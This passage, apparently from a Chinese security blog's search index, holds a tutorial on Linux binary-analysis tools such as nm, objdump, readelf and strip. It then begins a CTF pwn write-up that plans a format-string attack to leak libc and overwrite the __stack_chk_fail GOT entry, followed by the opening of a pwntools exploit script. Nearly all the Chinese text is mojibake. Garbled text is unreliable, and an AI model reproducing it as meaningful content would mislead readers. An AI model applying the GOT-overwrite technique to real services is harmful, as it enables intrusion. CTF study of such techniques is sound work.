strippedï¼‰\næˆ‘ä»¬å¯¹ä¸€ä¸ªæ–‡æœ¬æ–‡æ¡£è¯•ä¸€ä¸‹ï¼š\næˆ‘ä»¬å‘ç°fileå‘½ä»¤èƒ½è¯†åˆ«å‡ºå®ƒæ˜¯ä¸€ä¸ªpythonè„šæœ¬ï¼ŒåŒæ—¶è¯†åˆ«å‡ºäº†å®ƒæ˜¯ä¸€ä¸ªUTF-8ç¼–ç çš„æ–‡ä»¶ï¼Œè€Œä¸”æ ‡å‡ºä»–æ˜¯ä¸€ä¸ªæ–‡æœ¬å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆtext executableï¼‰ï¼Œå¯¹åº”ä¸Šé¢çš„LSB executableï¼ŒLinuxæ ‡å‡†åŸºç¡€ï¼ˆLinux Standards Baseï¼Œç®€ç§°LSBï¼‰å¯æ‰§è¡Œæ–‡ä»¶\nå¦‚æœæˆ‘ä»¬å»é™¤.pyæ‰©å±•åï¼Œå®ƒæ˜¯å¦è¿˜èƒ½è¯†åˆ«å‡ºæ¥å®ƒæ˜¯ä¸€ä¸ªpythonè„šæœ¬å‘¢ï¼Ÿ\nä»ç„¶å¯ä»¥è¯†åˆ«ï¼Œè¯´æ˜fileå‘½ä»¤ä¼šæ ¹æ®æ–‡ä»¶å†…å®¹è¿›è¡Œåˆ¤æ–­\næˆ‘ä»¬æ–°å»ºä¸€ä¸ªtmpæ–‡ä»¶ï¼Œçœ‹çœ‹èƒ½è¯†åˆ«å‡ºä»€ä¹ˆï¼š\nå¾—åˆ°ç»“æœæ˜¯empty\nå¦‚æœæˆ‘ä»¬åŠ ä¸Šä¸€ä¸ªshebangï¼š\nå‘ç°å®ƒæ­¤æ—¶ä¸èƒ½åˆ¤æ–­å®ƒæ˜¯ä¸€ä¸ªpythonæ–‡ä»¶ï¼Œä½†æ˜¯é€šè¿‡shebangåˆ¤æ–­å‡ºäº†å®ƒçš„è§£é‡Šå™¨\nå¦‚æœæˆ‘ä»¬åŠ ä¸Šä¸€å¥pythonè¯­å¥ï¼š\nå¦‚æœæˆ‘ä»¬åŠ ä¸ŠCè¯­è¨€ä»£ç ï¼š\nå®ƒä»ç„¶åˆ¤æ–­ä¸ºpythonè„šæœ¬ï¼Œè¯´æ˜fileç»™å‡ºçš„ç»“æœä¸ä¸€å®šæ˜¯æ­£ç¡®çš„ï¼Œéœ€è¦å…·ä½“é—®é¢˜å…·ä½“åˆ†æã€‚fileå‘½ä»¤ä¹Ÿå¯ä»¥æ ¹æ®å¹»æ•°åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œç„¶è€Œè¿™æ—¶å€™å¯èƒ½ä¼šå¯¼è‡´fileçš„åˆ¤æ–­å‡ºç°å·®é”™\nå¦‚æœä¸€ä¸ªæ–‡ä»¶ç¢°å·§åŒ…å«äº†æŸç§æ–‡ä»¶æ ¼å¼çš„æ ‡è®°ï¼Œfileç­‰å·¥å…·å¾ˆå¯èƒ½ä¼šé”™è¯¯åœ°è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ã€‚ä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªåå…­è¿›åˆ¶æ–‡ä»¶ç¼–è¾‘å™¨å°†ä»»ä½•æ–‡ä»¶çš„å‰ 4 å­—èŠ‚ä¿®æ”¹ä¸º Java çš„å¹»æ•°åºåˆ— CA FE BA BEï¼Œè‡ªå·±è¯å®ä¸€ä¸‹ä¸Šè¿°æƒ…å†µã€‚è¿™æ—¶ï¼Œfile ä¼šå°†è¿™ä¸ªæ–°ä¿®æ”¹çš„æ–‡ä»¶é”™è¯¯åœ°è¯†åˆ«ä¸ºå·²ç¼–è¯‘çš„ Java ç±»æ•°æ®ã€‚åŒæ ·ï¼Œä¸€ä¸ªä»…åŒ…å« MZ è¿™ä¸¤ä¸ªå­—ç¬¦çš„æ–‡æœ¬æ–‡ä»¶ä¼šè¢«è¯¯è®¤ä¸ºæ˜¯ä¸€ä¸ª MS-DOS å¯æ‰§è¡Œæ–‡ä»¶ã€‚\nå¦‚æœæˆ‘ä»¬å»æ‰shebangï¼Œå°±å¯ä»¥å‘ç°å®ƒæ˜¯ä¸€ä¸ªCè¯­è¨€æºæ–‡ä»¶ï¼š\næˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡é€šé…ç¬¦å¯¹ç‰¹å®šä¸€æ‰¹æ–‡ä»¶è¿›è¡Œåˆ†æï¼š\nå¯ä»¥ä½¿ç”¨grepé€‰æ‹©ï¼š\nfileè¿˜æœ‰ä¸€ç³»åˆ—é€‰é¡¹ï¼Œä½†ä¸€èˆ¬æ¥è¯´è¿™å·²ç»å¤Ÿäº†\nå¦‚æœæˆ‘ä»¬å¸Œæœ›åœ¨Windowsä¸Šä½¿ç”¨ï¼Œå¯ä»¥å®‰è£…Cygwin\nnm è™½ç„¶åå­—æœ‰äº›è®©äººæµ®æƒ³è”ç¿©ï¼Œä½†æ˜¯å®ƒç¡®å®åœ¨æŸäº›æƒ…å†µæŒºå¥½ç”¨çš„\nnmæ˜¯ä¸€ä¸ªåˆ†ææ–‡ä»¶ä¸­çš„ç¬¦å·çš„å‘½ä»¤ï¼Œå®ƒå¯ä»¥å°†å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„å‡½æ•°ç¬¦å·åˆ†ç±»åˆ—å‡ºï¼š\næˆ‘ä»¬å‘ç°å®ƒæ˜¯ä¸€ä¸ªC++å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”å®ƒçš„ç¬¦å·éƒ½è¢«åˆ†ç±»åˆ—å‡ºäº†ï¼ˆä»¥ä¸‹ç¿»è¯‘è‡ªman nmï¼‰ï¼š\nå¤§å†™å­—æ¯è¡¨ç¤ºå…¨å±€ç¬¦å·ï¼Œå°å†™å­—æ¯åˆ™è¡¨ç¤ºå±€éƒ¨ç¬¦å·ã€‚ä½†æœ‰ä¸€äº›å°å†™å­—æ¯è¡¨ç¤ºç‰¹æ®Šçš„å«ä¹‰ï¼ˆ\u0026ldquo;u\u0026rdquo;, \u0026ldquo;v\u0026rdquo; , \u0026ldquo;w\u0026rdquo;ï¼‰\nç±»å‹æ ‡å¿— æ„ä¹‰ A ç¬¦å·çš„å€¼æ˜¯ç»å¯¹çš„ï¼Œä¸ä¼šå› ä¸ºè¿›ä¸€æ­¥çš„é“¾æ¥è€Œæ”¹å˜ã€‚ B è§ä¸‹ b ç¬¦å·åœ¨BSSæ•°æ®éƒ¨åˆ†ã€‚ è¿™ä¸ªéƒ¨åˆ†é€šå¸¸åŒ…å«é›¶åˆå§‹åŒ–æˆ–æœªåˆå§‹åŒ–çš„æ•°æ®ã€‚å°½ç®¡å…·ä½“è¡Œä¸ºå–å†³äºç³»ç»Ÿã€‚ C è§ä¸‹ c ç¬¦å·æ˜¯æ™®é€šçš„ã€‚ é€šç”¨ç¬¦å·æ˜¯æœªåˆå§‹åŒ–çš„æ•°æ®ã€‚ åœ¨é“¾æ¥æ—¶ï¼Œå¤šä¸ªå…¬å…±ç¬¦å·å¯èƒ½ä¼šå‡ºç°ç›¸åŒçš„åç§°ã€‚ å¦‚æœè¯¥ç¬¦å·åœ¨ä»»ä½•åœ°æ–¹è¢«å®šä¹‰ï¼Œå…¬å…±ç¬¦å·ä¼šè¢«å½“ä½œæœªå®šä¹‰çš„å¼•ç”¨ã€‚å½“ç¬¦å·ä½äºå°å…¬æ–‡çš„ç‰¹æ®Šéƒ¨åˆ†æ—¶ï¼Œå°å†™çš„cå­—ç¬¦è¢«ä½¿ç”¨ã€‚ D è§ä¸‹ d ç¬¦å·åœ¨åˆå§‹åŒ–æ•°æ®éƒ¨åˆ†ã€‚ G è§ä¸‹ g ç¬¦å·åœ¨å°å¯¹è±¡çš„åˆå§‹åŒ–æ•°æ®éƒ¨åˆ†ã€‚ä¸€äº›å¯¹è±¡æ–‡ä»¶æ ¼å¼å…è®¸æ›´æœ‰æ•ˆåœ°è®¿é—®å°çš„æ•°æ®å¯¹è±¡ï¼Œä¾‹å¦‚ä¸€ä¸ªå…¨å±€intå˜é‡ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå¤§çš„å…¨å±€æ•°ç»„ã€‚ i å¯¹äºPEæ ¼å¼çš„æ–‡ä»¶ï¼Œè¿™è¡¨ç¤ºè¯¥ç¬¦å·åœ¨ä¸€ä¸ªç‰¹å®šçš„DLLså®ç°éƒ¨åˆ†ã€‚å¯¹äºELFæ ¼å¼æ–‡ä»¶ï¼Œè¿™è¡¨ç¤ºè¯¥ç¬¦å·æ˜¯ä¸€ä¸ªé—´æ¥å‡½æ•°ã€‚ è¿™æ˜¯ä¸€ä¸ªGNUå¯¹ç¬¦å·ç±»å‹çš„GNUæ‰©å±•ã€‚ å®ƒè¡¨ç¤ºä¸€ä¸ªç¬¦å·ï¼Œå¦‚æœè¢«é‡å®šä½å¼•ç”¨ï¼Œä¸ä¼šè¯„ä¼°åˆ°å…¶åœ°å€ï¼Œè€Œæ˜¯å¿…é¡»åœ¨è¿è¡Œæ—¶è°ƒç”¨ã€‚ è¿è¡Œæ—¶çš„æ‰§è¡Œå°†è¿”å›ç”¨äºé‡å®šä½çš„å€¼åœ¨é‡å®šä½ä¸­ä½¿ç”¨çš„å€¼ã€‚æ³¨æ„ - GNUé—´æ¥ç¬¦å·çš„å®é™…ç¬¦å·æ˜¾ç¤ºç”± \u0026ndash;ifunc-chars å‘½ä»¤è¡Œé€‰é¡¹æ§åˆ¶ã€‚å¦‚æœæä¾›äº†è¿™ä¸ªé€‰é¡¹ï¼Œé‚£ä¹ˆå­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å°†è¢«ç”¨äºå…¨å±€é—´æ¥å‡½æ•°ç¬¦å·ã€‚ å¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«ç¬¬äºŒä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆå®ƒå°†è¢«ç”¨äºæœ¬åœ°é—´æ¥å‡½æ•°ç¬¦å·ã€‚ I ç¬¦å·æ˜¯å¯¹å¦ä¸€ä¸ªç¬¦å·çš„é—´æ¥å¼•ç”¨ã€‚ N è¯¥ç¬¦å·æ˜¯ä¸€ä¸ªè°ƒè¯•ç¬¦å·ã€‚ n ç¬¦å·åœ¨åªè¯»æ•°æ®éƒ¨åˆ†ã€‚ p è¯¥ç¬¦å·åœ¨å †æ ˆè§£å‹éƒ¨åˆ†ã€‚ R è§ä¸‹ r ç¬¦å·åœ¨åªè¯»æ•°æ®éƒ¨åˆ†ã€‚ S è§ä¸‹ s ç¬¦å·åœ¨æœªåˆå§‹åŒ–æˆ–é›¶åˆå§‹åŒ–çš„å°å¯¹è±¡çš„æ•°æ®æ®µä¸­ã€‚ T è§ä¸‹ t ç¬¦å·åœ¨æ–‡æœ¬ï¼ˆä»£ç ï¼‰éƒ¨åˆ†ã€‚ U ç¬¦å·æ˜¯æœªå®šä¹‰çš„ã€‚ u è¯¥ç¬¦å·æ˜¯ä¸€ä¸ªå”¯ä¸€çš„å…¨å±€ç¬¦å·ã€‚ è¿™æ˜¯ä¸€ä¸ªGNUå¯¹ELFç¬¦å·ç»‘å®šæ ‡å‡†é›†çš„æ‰©å±•ã€‚ å¯¹äºç¬¦å·ï¼ŒåŠ¨æ€é“¾æ¥å™¨å°†ç¡®ä¿åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œåªæœ‰ä¸€ä¸ªå…·æœ‰æ­¤åç§°å’Œç±»å‹çš„ç¬¦å·åœ¨ä½¿ç”¨ã€‚å’Œç±»å‹çš„ç¬¦å·åœ¨ä½¿ç”¨ã€‚ V è§ä¸‹ v ç¬¦å·æ˜¯ä¸€ä¸ªå¼±å¯¹è±¡ã€‚ å½“ä¸€ä¸ªå¼±å®šä¹‰çš„ç¬¦å·ä¸ä¸€ä¸ªæ­£å¸¸å®šä¹‰çš„ç¬¦å·è¿æ¥æ—¶ï¼Œæ­£å¸¸å®šä¹‰çš„ç¬¦å·è¢«ä½¿ç”¨ï¼Œæ²¡æœ‰ä»»ä½•é”™è¯¯ã€‚ å½“ä¸€ä¸ªå¼±çš„æœªå®šä¹‰çš„ç¬¦å·è¢«é“¾æ¥å¹¶ä¸”è¯¥ç¬¦å·æœªè¢«å®šä¹‰æ—¶ï¼Œå¼±çš„ç¬¦å·çš„å€¼ä¼šå˜æˆé›¶ï¼Œå¹¶ä¸”æ²¡æœ‰é”™è¯¯ã€‚ç¬¦å·çš„å€¼å˜æˆäº†é›¶ï¼Œæ²¡æœ‰ä»»ä½•é”™è¯¯ã€‚ åœ¨æŸäº›ç³»ç»Ÿä¸­ï¼Œå¤§å†™å­—æ¯è¡¨ç¤ºé»˜è®¤å€¼å·²è¢«æŒ‡å®šã€‚ W è§ä¸‹ w è¯¥ç¬¦å·æ˜¯ä¸€ä¸ªå¼±ç¬¦å·ï¼Œæ²¡æœ‰è¢«ç‰¹åˆ«æ ‡è®°ä¸ºå¼±å¯¹è±¡ç¬¦å·ã€‚ å½“ä¸€ä¸ªå¼±å®šä¹‰çš„ç¬¦å·ä¸æ­£å¸¸å®šä¹‰çš„ç¬¦å·ç›¸è¿æ¥æ—¶ï¼Œæ­£å¸¸å®šä¹‰çš„ç¬¦å·è¢«ä½¿ç”¨ï¼Œæ²¡æœ‰ä»»ä½•é”™è¯¯ã€‚ å½“ä¸€ä¸ªå¼±çš„ç¬¦å·è¢«é“¾æ¥ï¼Œå¹¶ä¸”è¯¥ç¬¦å·æ²¡æœ‰è¢«å®šä¹‰ï¼Œé‚£ä¹ˆè¯¥ç¬¦å·çš„å€¼å°†ä»¥ç³»ç»Ÿç‰¹å®šçš„æ–¹å¼ç¡®å®šï¼Œè€Œä¸ä¼šå‡ºç°é”™è¯¯ã€‚ç¬¦å·çš„å€¼ä»¥ç³»ç»Ÿç‰¹å®šçš„æ–¹å¼ç¡®å®šï¼Œæ²¡æœ‰é”™è¯¯ã€‚ åœ¨æŸäº›ç³»ç»Ÿä¸Šï¼Œå¤§å†™å­—æ¯è¡¨ç¤ºå·²ç»æŒ‡å®šäº†ä¸€ä¸ªé»˜è®¤å€¼ã€‚ - ç¬¦å·æ˜¯a.outå¯¹è±¡æ–‡ä»¶ä¸­çš„stabsç¬¦å·ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¥ä¸‹æ¥æ‰“å°çš„å€¼æ˜¯stabs otherå­—æ®µï¼Œstabs descå­—æ®µï¼Œä»¥åŠstabç±»å‹ã€‚ stabsç¬¦å·æ˜¯ç”¨æ¥ä¿å­˜è°ƒè¯•ä¿¡æ¯çš„ã€‚ ? ç¬¦å·ç±»å‹æœªçŸ¥ï¼Œæˆ–å¯¹è±¡æ–‡ä»¶æ ¼å¼ç‰¹å®šã€‚ æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨nm -D loginåªæ‰“å°å‡ºåŠ¨æ€é“¾æ¥çš„ç¬¦å·ï¼š\næˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ä½¿ç”¨fileä¸€æ ·ä½¿ç”¨é€šé…ç¬¦æ‰¹é‡è§£ææ–‡ä»¶\næ›´å¤šé€‰é¡¹è§nm --helpæˆ–man nm\nc++filt è¿™ä¸ªå‘½ä»¤å¯ä»¥ååŒnmå‘½ä»¤ä½¿ç”¨ã€‚å› ä¸ºC++ä¸­æœ‰æ¨¡æ¿ã€é‡è½½ç­‰ï¼Œå› ä¸ºè¦å”¯ä¸€æ ‡å¿—ä¸€ä¸ªåŒåå‡½æ•°ï¼Œæ‰€ä»¥ç¼–è¯‘å‡ºæ¥çš„å‡½æ•°åä¼šéå¸¸å¥‡æ€ªï¼Œéš¾ä»¥é˜…è¯»\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨c++filtæ¥é‡å‘½åè¿™äº›å‡½æ•°\næ³¨æ„ï¼ŒC++filtçš„é‡å‘½åæœ‰å¯èƒ½å› ç¨‹åºä½¿ç”¨çš„ç¼–è¯‘å™¨ä¸åŒè€Œå¤±è´¥ï¼Œä¹Ÿå¯èƒ½ä¸¢å¤±ä¸€äº›ä¿¡æ¯\nnm login | c++filt æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ—¶å€™å‡½æ•°åå°±ç±»ä¼¼äºç¼–å†™C++ç¨‹åºæ—¶ä½¿ç”¨çš„å‡½æ•°åäº†\næˆ‘ä»¬è¿˜å¯ä»¥æ›´æ”¹è¿™ä¸ªå‘ˆç°å‡½æ•°çš„å½¢å¼ï¼š\nnm login | c++filt -s java ldd è¿™ä¸ªå‘½ä»¤å¾ˆå¸¸ç”¨ï¼Œæ˜¯ç”¨æ¥æŸ¥çœ‹åŠ¨æ€é“¾æ¥ç¨‹åºæ‰€ä½¿ç”¨çš„åŠ¨æ€åº“çš„ï¼š\nå¯ä»¥åŠ ä¸Š-væ¥æŸ¥çœ‹æ›´å¤šä¿¡æ¯\nlddå‘½ä»¤å¯ä»¥åœ¨æˆ‘ä»¬å¯¹ä¸€ä¸ªç¨‹åºä½¿ç”¨patchelfå‘½ä»¤æ›´æ¢åŠ¨æ€åº“çš„æ—¶å€™æä¾›å‘å¯¼\nobjdump ä½¿ç”¨çº¿æ€§åæ±‡ç¼–å¯¹ç¨‹åºè¿›è¡Œé™æ€åˆ†æ\næˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ç¨‹åºçš„å¤´éƒ¨ï¼ˆèµ·åˆ°å’Œfileå‘½ä»¤ç±»ä¼¼çš„ä½œç”¨ï¼‰ï¼š\næŸ¥çœ‹file headerçš„æ€»è§ˆï¼š\næŸ¥çœ‹file headerçš„ç®€åŒ–ç‰ˆæœ¬ï¼š\næ˜¾ç¤ºç‰¹å®šå¯¹è±¡æ ¼å¼çš„æ–‡ä»¶å¤´å†…å®¹ï¼š\nä¹Ÿå¯ä»¥å•ç‹¬æŸ¥çœ‹èŠ‚å¤´ï¼š\nå¯ä»¥ç›´æ¥æŸ¥çœ‹æ‰€æœ‰headerï¼š\nå¯ä»¥æŸ¥çœ‹ç¨‹åºçš„è°ƒè¯•ä¿¡æ¯ï¼š\nå¯ä»¥ä¸åŠ åˆ†æåœ°æŸ¥çœ‹æ‰€æœ‰èŠ‚å¤´çš„äºŒè¿›åˆ¶ä¿¡æ¯ï¼š\nå¯ä»¥åªæŸ¥çœ‹å¯æ‰§è¡ŒèŠ‚çš„åæ±‡ç¼–ç»“æœï¼š\nè¿™æ ·çš„æ–‡æœ¬æ–‡ä»¶å«åšåæ±‡ç¼–æ­»ä»£ç æ¸…å•ï¼ˆdead listingï¼‰ï¼Œå°½ç®¡è¿™äº›æ–‡ä»¶å¯ç”¨äºå®æ–½é€†å‘å·¥ç¨‹ï¼Œä½†å®ƒä»¬å¾ˆéš¾æœ‰æ•ˆå¯¼èˆªï¼Œä¹Ÿæ— æ³•ä»¥ä¸€è‡´ä¸”æ— é”™çš„æ–¹å¼è¢«ä¿®æ”¹ã€‚\nä½†æ˜¯å®ƒçš„åæ±‡ç¼–ç»“æœæ˜¯AT\u0026amp;Té£æ ¼çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ¢ä¸ºIntelé£æ ¼ï¼š\nè¿˜æœ‰æ›´å¤šç”¨æ³•å¯ä»¥æŸ¥çœ‹objdump --helpæˆ–man objdump\nstrings stringså¯ä»¥æœç´¢è‡³å°‘åŒ…å« 4 ä¸ªè¿ç»­å¯æ‰“å° ASCII å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå¹¶å°†ç»“æœåœ¨æ§åˆ¶å°æ‰“å°å‡ºæ¥ï¼ˆç¨‹åºè™½ç„¶åŒ…å«è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯å¹¶ä¸ä»£è¡¨ç¨‹åºä¼šä½¿ç”¨ï¼‰ï¼Œæœ‰ä¸€äº›å­—ç¬¦ä¸²æ˜¯ç¨‹åºå®é™…ä½¿ç”¨çš„ï¼Œæœ‰ä¸€äº›æ˜¯ç¨‹åºçš„å‡½æ•°åç­‰\næˆ‘ä»¬å¯ä»¥åªæ‰“å°.dataèŠ‚ä¸­çš„å­—ç¬¦ä¸²ï¼š\næˆ‘ä»¬å¯ä»¥æŒ‡å®šåŒ…å«å¤šå°‘ä¸ªè¿ç»­å¯æ‰“å°å­—ç¬¦çš„å­—ç¬¦ä¸²ä¼šè¢«è¾“å‡ºï¼š\nreadelf readelfä¸objdumpå¤§ä½“ç›¸åŒï¼Œä¸»è¦åŒºåˆ«åœ¨äº readelf å¹¶ä¸ä¾èµ– libbfd\nreadelf -S æŸ¥è¯¢èŠ‚å¤´è¡¨ -l æŸ¥è¯¢ç¨‹åºå¤´è¡¨ -s æŸ¥è¯¢ç¬¦å·è¡¨ -e æŸ¥è¯¢ELFæ–‡ä»¶å¤´æ•°æ® -r æŸ¥è¯¢é‡å®šä½å…¥å£ -d æŸ¥è¯¢åŠ¨æ€æ®µ å¯¹ELFçš„å…·ä½“è§£è¯»è¯·é˜…è¯»æˆ‘å†™çš„ELFè¯¦è§£\nndisasm ndisasmæ˜¯Netwide Assemblerï¼ˆNASMï¼‰æä¾›çš„æµå¼åæ±‡ç¼–å™¨\næˆ‘ä»¬é€‰æ‹©æ¶æ„ä¸º64ä½intelæŒ‡ä»¤é›†ï¼Œå¹¶å°†åæ±‡ç¼–ç»“æœè¾“å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼š\nç”±äºæµå¼åæ±‡ç¼–éå¸¸çµæ´»ï¼Œå› æ­¤å®ƒçš„ç”¨é€”ç›¸å½“å¹¿æ³›ã€‚ä¾‹å¦‚ï¼Œåœ¨åˆ†æç½‘ç»œæ•°æ®åŒ…ä¸­å¯èƒ½åŒ…å«shellcode çš„è®¡ç®—æœºç½‘ç»œæ”»å‡»æ—¶ï¼Œå°±å¯ä»¥é‡‡ç”¨æµå¼åæ±‡ç¼–å™¨æ¥åæ±‡ç¼–æ•°æ®åŒ…ä¸­åŒ…å« shellcode çš„éƒ¨åˆ†ï¼Œä»¥åˆ†ææ¶æ„è´Ÿè½½çš„è¡Œä¸ºã€‚å¦å¤–ä¸€ç§æƒ…å†µæ˜¯åˆ†æé‚£äº›ä¸åŒ…å«å¸ƒå±€å‚è€ƒçš„ ROM é•œåƒã€‚ROM ä¸­æœ‰äº›éƒ¨åˆ†æ˜¯æ•°æ®ï¼Œå…¶ä»–éƒ¨åˆ†åˆ™ä¸ºä»£ç ï¼Œå¯ä»¥ä½¿ç”¨æµå¼åæ±‡ç¼–å™¨æ¥åæ±‡ç¼–é•œåƒä¸­çš„ä»£ç \nobjcopy objcopyç”¨äºå°†objectçš„éƒ¨åˆ†è·å…¨éƒ¨å†…å®¹æ‹·è´åˆ°å¦ä¸€ä¸ªobjectï¼Œè¿™é‡Œçš„objecté€šå¸¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶\næˆ‘ä»¬å¯ä»¥å°†è°ƒè¯•ä¿¡æ¯åˆ†ç¦»ï¼š\nå¯ä»¥å‰¥ç¦»è°ƒè¯•ä¿¡æ¯ï¼š\næ³¨æ„ï¼Œè¿™é‡Œåªæ˜¯å‰¥ç¦»äº†è°ƒè¯•ä¿¡æ¯ï¼Œå¹¶ä¸ä»£è¡¨ç¬¦å·è¡¨è¢«å‰¥ç¦»äº†ï¼š\nå¯ä»¥å°†è°ƒè¯•ä¿¡æ¯åŠ å›å»ï¼š\næ›´å¤šé˜…è¯»ï¼š\nobjcopyçš„ä½¿ç”¨_crystonyçš„åšå®¢-CSDNåšå®¢_objcopy è·å–æŸä¸ªsection Linux å‘½ä»¤ï¼ˆ69ï¼‰â€”â€” objcopy å‘½ä»¤_æ‹å–µå¤§é²¤é±¼çš„åšå®¢-CSDNåšå®¢_objcopy GNU Objcopyè¯­æ³•å’Œä½¿ç”¨_StudyTaooçš„åšå®¢-CSDNåšå®¢_objcopy strip æˆ‘ä»¬åœ¨åšctfé¢˜ç›®çš„è¿‡ç¨‹ä¸­ï¼Œå¸¸å¸¸ä¼šæœ‰ä¸€äº›å–„è‰¯çš„å‡ºé¢˜è€…å°†ç¬¦å·è¡¨åˆ é™¤ï¼Œå¯¼è‡´idaè§£æå‡ºæ¥çš„å‡½æ•°åˆ—è¡¨æ²¡æœ‰åå­—ï¼Œæå…¶éš¾æ‡‚\né‚£ä¹ˆï¼Œæˆ‘ä»¬è¦å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä½¿ç”¨stripå‘½ä»¤ï¼š\nstrip \u0026lt;ç¨‹åºå\u0026gt; ç„¶åå°±åªå‰©ä¸‹.dynsymäº†ï¼š\nè¿™æ ·ä¹Ÿä¸å½±å“ç¨‹åºè¿è¡Œï¼Œè¾¾åˆ°äº†ç»™ç¨‹åºç˜¦èº«çš„ç›®çš„ï¼Œåªæ˜¯ä¸åˆ©äºåç¼–è¯‘ğŸ¤­\nsize ç”¨äºåˆ—å‡ºç›®æ ‡æ–‡ä»¶æˆ–åº“æ–‡ä»¶çš„sectionå¤§å°\n","date":"2023å¹´01æœˆ22æ—¥","permalink":"https://peterliuzhi.top/tricks/linux%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%88%86%E6%9E%90%E6%96%87%E4%BB%B6%E7%9A%84%E5%B0%8F%E5%B7%A5%E5%85%B7/","section":"tricks","summary":"Action is the foundational key to all success. â€” Pablo Picasso ğŸ’¡å¦‚éœ€ä½¿ç”¨æœ¬æ–‡ä¸­ä»‹ç»çš„å¤§éƒ¨åˆ†å‘½ä»¤ï¼Œè¯·ç¡®ä¿ç³»ç»Ÿå®‰è£…äº†binutilsï¼Œå¦‚æœªå®‰è£…ï¼Œè¯·ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£…ï¼šsudo apt-get install binutils file æˆ‘ä»¬å¯¹ä¸€ä¸ªæ–‡ä»¶","tags":["re","pwn","tools"],"title":"Linuxä¸­å¸¸ç”¨çš„åˆ†ææ–‡ä»¶çš„å°å·¥å…·"},{"categories":["writeup","HGame"],"contents":" I\u0026rsquo;d rather attempt to do something great and fail than to attempt to do nothing and succeed. â€” Robert Schuller\nä¸ŠæœŸè§è¿™é‡Œ\nYukkuriSay checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ å‘ç°äº†canaryï¼Œä½†æ˜¯è¿™é¢˜æº¢å‡ºä¸åˆ°canaryï¼Œé‚£ä¹ˆå¯èƒ½å¯ä»¥åˆ©ç”¨canaryå…¶ä»–çš„æ¼æ´ï¼Œæ¯”å¦‚æ›´æ”¹__stack_check_failçš„gotå€¼\nidaæŸ¥çœ‹ä¼ªCä»£ç  å‡½æ•°ä¸»ä½“æ˜¯ä¸€ä¸ªä¸æ–­å‘ä¸€ä¸ªæ²¡æœ‰æº¢å‡ºæ¼æ´çš„æ ˆç©ºé—´å†™å…¥å†…å®¹ï¼ˆè¿™ä¸ªå†…å®¹è¢«ç”¨%sæ‰“å°å‡ºæ¥ï¼Œæ²¡æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼‰ï¼Œç„¶åæ˜¯ä¸€ä¸ªéæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´\næ³•ä¸€ï¼šåˆ©ç”¨æ ˆä¸Šä¿å­˜çš„setbufferå‡½æ•°åœ°å€æ³„éœ²libcåæ›´æ”¹__stack_check_failçš„gotå€¼ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨%sçš„ç‰¹ç‚¹æŠŠè¿™ä¸ªsetbuffer+204æ‰“å°å‡ºæ¥ï¼Œç„¶åå°±æ³„éœ²å¾—åˆ°äº†æ ˆåœ°å€\nç„¶åæˆ‘ä»¬å†ç”¨åŒæ ·çš„æ–¹æ³•å¾—åˆ°æ ˆåœ°å€\nå› ä¸ºæˆ‘ä»¬ç¬¬ä¸€æ¬¡å†™å…¥çš„å†…å®¹ä¿å­˜åœ¨æ ˆä¸Šï¼Œæ‰€ä»¥æœ€åæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å®ç°ä»»æ„åœ°å€å†™ï¼Œæ›´æ”¹__stack_check_failçš„gotå€¼ä¸ºone_gadgetåï¼Œå†æ›´æ”¹canaryè§¦å‘__stack_check_fail\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = True fn: str = \u0026#34;./HGame-week2-YukkuriSay\u0026#34; libc_name: str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;31110\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # argsæ˜¯å˜é‡åï¼Œæ˜¯å­—ç¬¦ä¸² for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) 